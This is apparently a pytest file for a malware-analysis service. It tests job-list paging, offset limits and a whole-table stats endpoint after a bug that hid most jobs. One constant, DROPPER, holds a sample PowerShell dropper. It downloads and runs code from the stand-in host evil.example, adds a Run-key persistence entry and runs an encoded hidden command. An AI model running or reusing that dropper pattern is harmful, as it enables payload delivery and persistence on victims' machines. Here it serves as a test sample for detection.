"""Fifty rows presented as the whole deployment.

`GET /api/jobs` defaulted to `limit=50`, declared no `offset`, and returned a
bare array with no total. FastAPI drops query parameters a handler does not
declare, so `?offset=200` was accepted and silently ignored: every request
returned the same newest page, and rows past the first 50 could not be reached
through the endpoint at any limit.

Both readers sent no parameters at all. `Queue.tsx` printed the result under the
lede "Every sample submitted to this deployment", and `Dashboard.tsx` counted
its tiles, its donut, its file-type breakdown and its top-risk list from it.
Measured on the live deployment, against 269 top-level jobs:

    Analysed          50    truth 269
    Malicious         10    truth 151
    Needs attention   16    truth 197
    unreachable rows  71

Nothing errored. The dashboard of a security product reported a seventh of the
malicious samples it held and described the number as its overview.

Paging alone does not fix the dashboard — the limit is capped at 200 and the
table is already larger — so the counts moved to `GET /api/jobs/stats`, computed
in SQL over the whole tenant. `frontend/src/lib/format.ts` still owns the
definitions; the SQL mirrors it, and `test_the_definitions_agree` is what keeps
them honest.
"""
from __future__ import annotations

import pytest

from app.schemas import MAX_OFFSET
from tests.test_api import _poll_until_done, _submit

CLEAN = b"# just a note\nnothing to see\n"
DROPPER = (
    b"$c = New-Object Net.WebClient\n"
    b"$c.DownloadFile('http://evil.example/p.exe', \"$env:TEMP\\p.exe\")\n"
    b"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.example/s')\n"
    b"New-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    b" -Name Upd -Value 'p.exe'\n"
    b"powershell -enc SQBFAFgA -w hidden\n"
)


def _seed(client, auth, count: int) -> list[str]:
    ids = []
    for n in range(count):
        ids.append(_submit(client, auth, f"note-{n}.txt", CLEAN + str(n).encode()))
    for public_id in ids:
        _poll_until_done(client, auth, public_id)
    return ids


# --- the page says how big the whole thing is --------------------------------


def test_the_response_carries_a_total(client, auth) -> None:
    _seed(client, auth, 3)
    page = client.get("/api/jobs?limit=2", headers=auth).json()
    assert len(page["items"]) == 2
    assert page["total"] >= 3, page
    assert page["limit"] == 2 and page["offset"] == 0


def test_offset_actually_moves(client, auth) -> None:
    """The defect exactly: offset was accepted and ignored, so page two was
    page one and nothing past the first page existed."""
    _seed(client, auth, 5)
    first = client.get("/api/jobs?limit=2&offset=0", headers=auth).json()["items"]
    second = client.get("/api/jobs?limit=2&offset=2", headers=auth).json()["items"]

    assert first and second
    assert first[0]["public_id"] != second[0]["public_id"], (
        "offset=2 returned the same first row as offset=0"
    )
    assert not ({j["public_id"] for j in first} & {j["public_id"] for j in second})


def test_every_row_is_reachable_by_paging(client, auth) -> None:
    """The property that matters: walk the pages and get the whole table."""
    seeded = set(_seed(client, auth, 7))
    total = client.get("/api/jobs?limit=1", headers=auth).json()["total"]

    # The suite shares one database, so `total` is however many jobs every test
    # before this one submitted. Size the page to keep the walk to a handful of
    # requests: a fixed page of two made sixty calls and tripped the rate
    # limiter, which is a real production limit and should stay where it is.
    size = max(2, -(-total // 5))
    walked: list[str] = []
    offset = 0
    while offset < total:
        page = client.get(f"/api/jobs?limit={size}&offset={offset}", headers=auth).json()
        assert page["items"], f"empty page at offset {offset} of {total}"
        walked.extend(j["public_id"] for j in page["items"])
        offset += size

    assert len(walked) == total
    assert len(set(walked)) == total, "a job appeared on two pages"
    assert seeded <= set(walked)


def test_paging_past_the_end_is_empty_not_an_error(client, auth) -> None:
    _seed(client, auth, 2)
    page = client.get("/api/jobs?limit=50&offset=10000", headers=auth).json()
    assert page["items"] == []
    assert page["total"] >= 2


def test_a_negative_offset_is_refused(client, auth) -> None:
    """`limit=-1` was already 422 because SQLite reads `LIMIT -1` as unbounded.
    An offset has the same shape of problem and gets the same treatment."""
    assert client.get("/api/jobs?offset=-1", headers=auth).status_code == 422


def test_the_ordering_is_stable_across_pages(client, auth) -> None:
    """Jobs seeded in one test run share a timestamp to the second, and
    `ORDER BY created_at DESC` alone lets equal rows come back in any order —
    which is how a paged walk silently skips one row and repeats another."""
    _seed(client, auth, 6)
    walked = []
    for offset in (0, 2, 4, 6):
        walked.extend(
            j["public_id"]
            for j in client.get(f"/api/jobs?limit=2&offset={offset}", headers=auth).json()["items"]
        )
    assert len(walked) == len(set(walked)), "the same job appeared twice while paging"


# --- and the dashboard counts everything -------------------------------------


def test_stats_counts_the_whole_table_not_a_page(client, auth) -> None:
    _seed(client, auth, 4)
    _poll_until_done(client, auth, _submit(client, auth, "dropper.ps1", DROPPER))

    stats = client.get("/api/jobs/stats", headers=auth).json()
    page = client.get("/api/jobs?limit=1", headers=auth).json()

    assert stats["total"] == page["total"]
    assert stats["completed"] >= 5
    assert sum(stats["verdicts"].values()) == stats["completed"], (
        "the four buckets must add up to the completed count, or the donut lies"
    )
    assert set(stats["verdicts"]) == {"malicious", "suspicious", "clean", "unclassified"}


def test_stats_survives_a_page_boundary(client, auth) -> None:
    """The regression in one line: seed more than one page and check the count
    does not stop at the page size."""
    _seed(client, auth, 12)
    stats = client.get("/api/jobs/stats", headers=auth).json()
    page = client.get("/api/jobs?limit=5", headers=auth).json()
    assert len(page["items"]) == 5
    assert stats["total"] >= 12, stats


def test_the_definitions_agree(client, auth) -> None:
    """`needs_attention` and the verdict buckets are now computed in SQL, while
    `frontend/src/lib/format.ts` still defines them for everything else. Two
    definitions of the same word is a defect waiting to happen, so this walks
    every job and applies the frontend's rule by hand."""
    _seed(client, auth, 3)
    _poll_until_done(client, auth, _submit(client, auth, "dropper.ps1", DROPPER))

    stats = client.get("/api/jobs/stats", headers=auth).json()
    everything = client.get("/api/jobs?limit=200", headers=auth).json()["items"]
    completed = [j for j in everything if j["status"] == "completed"]

    def verdict_of(job):
        v = (job.get("verdict") or {}).get("verdict")
        return v if v in ("malicious", "suspicious", "clean") else None

    def needs_attention(job):
        v = verdict_of(job)
        return v != "clean" if v else job["final_score"] >= 30

    assert stats["needs_attention"] == sum(1 for j in completed if needs_attention(j))
    for name in ("malicious", "suspicious", "clean"):
        assert stats["verdicts"][name] == sum(1 for j in completed if verdict_of(j) == name), name
    assert stats["verdicts"]["unclassified"] == sum(1 for j in completed if verdict_of(j) is None)


def test_top_risk_is_worst_first(client, auth) -> None:
    _seed(client, auth, 2)
    _poll_until_done(client, auth, _submit(client, auth, "dropper.ps1", DROPPER))

    top = client.get("/api/jobs/stats", headers=auth).json()["top_risk"]
    assert top, "a malicious sample was submitted and nothing was flagged"
    assert len(top) <= 5
    rank = {"malicious": 2, "suspicious": 1}
    keys = [
        (rank.get((j.get("verdict") or {}).get("verdict"), 0), j["final_score"]) for j in top
    ]
    assert keys == sorted(keys, reverse=True), keys


def test_stats_is_scoped_and_authenticated(client) -> None:
    assert client.get("/api/jobs/stats").status_code == 401


def test_stats_did_not_shadow_a_job_route(client, auth) -> None:
    """`/jobs/stats` sits beside `/jobs/{public_id}/…`. If it had been declared
    after a path-parameter route that could match it, "stats" would have been
    read as a job id."""
    public_id = _submit(client, auth, "note.txt", CLEAN)
    _poll_until_done(client, auth, public_id)
    assert client.get("/api/jobs/stats", headers=auth).status_code == 200
    assert client.post(f"/api/jobs/{public_id}/reanalyze", headers=auth).status_code == 200


# --- an offset is a number that reaches the database -------------------------


#: One past int64. Postgres OFFSET is a bigint, so this is the first value it
#: cannot hold — and every offset in this codebase was declared `ge=0` with no
#: ceiling, so it went straight through.
TOO_BIG = 9223372036854775808

PAGED = [
    "/api/jobs?limit=1&offset={n}",
    "/api/audit?limit=1&offset={n}",
    "/api/audit/export?offset={n}",
]


@pytest.mark.parametrize("path", PAGED)
def test_an_offset_past_int64_is_refused_not_a_500(client, auth, path) -> None:
    """Reproduced on the live deployment before the bound existed: a single
    authenticated GET, no body, and `GET /api/jobs`, `GET /api/audit` and
    `GET /api/audit/export` each answered **500 Internal Server Error** in
    text/plain — the one error shape no client on this API handles."""
    for value in (TOO_BIG, TOO_BIG * 2, 10**40):
        response = client.get(path.format(n=value), headers=auth)
        assert response.status_code in (401, 403, 422), (
            f"{path.format(n=value)} -> {response.status_code} {response.text[:120]}"
        )
        if response.status_code == 422:
            assert response.headers["content-type"].startswith("application/json")


def test_a_workable_offset_is_still_accepted(client, auth) -> None:
    """The other half: the bound must be far past anything real. A billion rows
    of quarantined samples would be petabytes on disk."""
    response = client.get(f"/api/jobs?limit=1&offset={MAX_OFFSET}", headers=auth)
    assert response.status_code == 200, response.text
    assert response.json()["items"] == []
